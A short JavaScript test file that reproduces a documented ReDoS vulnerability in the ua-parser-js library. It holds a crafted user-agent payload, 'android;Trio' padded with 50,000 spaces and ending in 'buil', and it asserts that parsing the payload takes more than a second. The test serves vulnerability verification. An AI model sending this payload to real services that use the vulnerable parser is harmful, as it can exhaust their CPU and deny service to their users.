//https://snyk.io/vuln/SNYK-JS-UAPARSERJS-1023599
//time coming < 1sec
test("ReDos in ua-parser-js", () => {
  const measureTime = require("./utils").measureTime;
  const ua_parser = require("ua-parser-js");

  let t = measureTime(function () {
    const N_SIZE = 50000;
    const MALICIOUS_UA = `android;Trio${" ".repeat(N_SIZE)}buil`; // Trigger Redos
    ua_parser(MALICIOUS_UA);
  });
  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
